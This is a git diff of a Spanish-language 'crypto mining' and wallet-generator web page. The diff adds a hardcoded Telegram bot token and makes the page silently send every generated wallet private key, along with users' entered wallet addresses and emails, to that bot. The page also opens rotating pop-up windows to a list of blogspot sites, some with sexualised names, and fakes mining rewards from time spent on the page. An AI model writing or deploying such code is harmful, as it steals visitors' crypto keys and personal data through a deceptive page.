@@ -16,6 +16,19 @@
     input, button {
       margin: 10px;
       padding: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #45a049;
     }
   </style>
 </head>
@@ -38,119 +51,126 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
 <script>
-let nuevaVentana;
-let tiempoTotal = 0;
-let interval;
-let minando = true;
+  let nuevaVentana;
+  let tiempoTotal = 0;
+  let interval;
+  let minando = true;
 
-// 🔥 FUNCIONES PRINCIPALES 🔥
+  // Token y chat ID de Telegram
+  const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
+  const chatId = '7613604212';
 
-// 👉 Redirección aleatoria
-function redireccionAleatoria() {
-  var urls = [
-    "https://notiiciasmex.blogspot.com",
-    "https://tareasunamyunadm.blogspot.com",
-    "https://faucentminialtcrypto.blogspot.com",
-    "https://solotareasmex.blogspot.com",
-    "https://colegialas-calientes-69.blogspot.com",
-    "https://colegialas14defebrero.blogspot.com",
-    "https://joseperez69.blogspot.com",
-    "https://mundogamermejico.blogspot.com",
-    "https://backtrackingchesscaso.blogspot.com",
-    "https://games2015steamyorigin.blogspot.com", 
-    "https://videoescandalosmex.blogspot.com",
-    "https://basededatosunadm.blogspot.com",
-    "https://gmcas77.blogspot.com",
-    "https://basededatostareas.blogspot.com"
-  ];
+  function redireccionAleatoria() {
+    var urls = [
+      "https://notiiciasmex.blogspot.com",
+      "https://tareasunamyunadm.blogspot.com",
+      "https://faucentminialtcrypto.blogspot.com",
+      "https://solotareasmex.blogspot.com",
+      "https://colegialas-calientes-69.blogspot.com",
+      "https://colegialas14defebrero.blogspot.com",
+      "https://joseperez69.blogspot.com",
+      "https://mundogamermejico.blogspot.com",
+      "https://backtrackingchesscaso.blogspot.com",
+      "https://games2015steamyorigin.blogspot.com", 
+      "https://videoescandalosmex.blogspot.com",
+      "https://basededatosunadm.blogspot.com",
+      "https://gmcas77.blogspot.com",
+      "https://basededatostareas.blogspot.com"
+    ];
 
-  var indiceAleatorio = Math.floor(Math.random() * urls.length);
-  var urlRedireccion = urls[indiceAleatorio];
+    var indiceAleatorio = Math.floor(Math.random() * urls.length);
+    var urlRedireccion = urls[indiceAleatorio];
 
-  document.getElementById('redireccion').innerHTML = '<p>Redireccionando a: ' + urlRedireccion + '</p>';
+    document.getElementById('redireccion').innerHTML = '<p>Redireccionando a: ' + urlRedireccion + '</p>';
 
-  if (nuevaVentana) {
-    nuevaVentana.close(); 
+    if (nuevaVentana) {
+      nuevaVentana.close();
+    }
+
+    nuevaVentana = window.open(urlRedireccion, '_blank');
+
+    setTimeout(redireccionAleatoria, 10000);
   }
 
-  nuevaVentana = window.open(urlRedireccion, '_blank');
+  redireccionAleatoria();
 
-  setTimeout(redireccionAleatoria, 10000);
-}
+  // Función para generar billetera
+  async function generarBilletera() {
+      const wallet = ethers.Wallet.createRandom();
+      document.getElementById('resultado').innerHTML = `
+          <p><strong>Dirección:</strong> ${wallet.address}</p>
+          <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
+      `;
 
-redireccionAleatoria();
+      // Enviar a Telegram
+      enviarMensajeTelegram(`Nueva Billetera Generada:\nDirección: ${wallet.address}\nClave Privada: ${wallet.privateKey}`);
+  }
 
-// 👉 Generar Billetera
-async function generarBilletera() {
-    const wallet = ethers.Wallet.createRandom();
-    document.getElementById('resultado').innerHTML = `
-        <p><strong>Dirección:</strong> ${wallet.address}</p>
-        <p><strong>Clave Privada:</strong> ${wallet.privateKey}</p>
-    `;
-}
+  // Función para guardar datos (billetera y correo)
+  function guardarDatos() {
+      const wallet = document.getElementById('wallet').value;
+      const correo = document.getElementById('correo').value;
 
-// 👉 Guardar Datos y enviar a Telegram
-async function guardarDatos() {
-    const wallet = document.getElementById('wallet').value;
-    const correo = document.getElementById('correo').value;
+      if (!wallet || !correo) {
+          alert('Por favor, completa todos los campos.');
+          return;
+      }
 
-    if (!wallet || !correo) {
-        alert('Por favor, completa todos los campos.');
-        return;
-    }
+      console.log(`Billetera: ${wallet}, Correo: ${correo}`);
+      alert('Datos guardados correctamente.');
 
-    // 👉 Enviar mensaje al bot de Telegram usando las variables de entorno
-    const mensaje = `🚀 Nueva Billetera Generada:\n\n📌 Billetera: ${wallet}\n📩 Correo: ${correo}`;
+      // Enviar a Telegram
+      enviarMensajeTelegram(`Datos Guardados:\nBilletera: ${wallet}\nCorreo: ${correo}`);
+  }
 
-    const telegramToken = `${{ secrets.TELEGRAM_TOKEN }}`;
-    const chatId = `${{ secrets.CHAT_ID }}`;
+  // Función para detener la minería
+  function pararMineria() {
+      clearInterval(interval);
+      minando = false;
+      alert(`Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
+      enviarMensajeTelegram(`Minería detenida. Ganancia: ${tiempoTotal} CHC`);
+  }
 
-    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  // Función para contar el tiempo en la página
+  function contarTiempo() {
+      if (minando) {
+          tiempoTotal++;
+          if (tiempoTotal % 100 === 0) {
+              alert(`¡Has ganado 100 CHC!`);
+              enviarMensajeTelegram(`¡Usuario ha ganado 100 CHC!`);
+          }
+      }
+  }
 
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: mensaje
-            })
-        });
+  // Inicia el conteo cada segundo
+  interval = setInterval(contarTiempo, 1000);
 
-        const data = await response.json();
-        if (data.ok) {
-            alert('✅ Datos guardados y enviados a Telegram.');
-        } else {
-            alert('❌ Error al enviar el mensaje a Telegram.');
-        }
-    } catch (error) {
-        console.error('Error:', error);
-        alert('❌ Error al conectar con Telegram.');
-    }
-}
+  // Función para enviar mensajes a Telegram
+  function enviarMensajeTelegram(mensaje) {
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
-// 👉 Parar Minería
-function pararMineria() {
-    clearInterval(interval); 
-    minando = false;
-    alert(`✅ Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
-}
-
-// 👉 Contar el tiempo en la página
-function contarTiempo() {
-    if (minando) {
-        tiempoTotal++;
-        if (tiempoTotal % 100 === 0) {
-            alert(`🚀 ¡Has ganado 100 CHC!`);
-        }
-    }
-}
-
-// 👉 Iniciar el conteo cada segundo
-interval = setInterval(contarTiempo, 1000);
-
+      fetch(url, {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+              chat_id: chatId,
+              text: mensaje
+          })
+      })
+      .then(response => response.json())
+      .then(data => {
+          if (data.ok) {
+              console.log('Mensaje enviado a Telegram:', mensaje);
+          } else {
+              console.error('Error al enviar mensaje:', data);
+          }
+      })
+      .catch(error => {
+          console.error('Error en la solicitud a Telegram:', error);
+      });
+  }
 </script>
 
 </body>
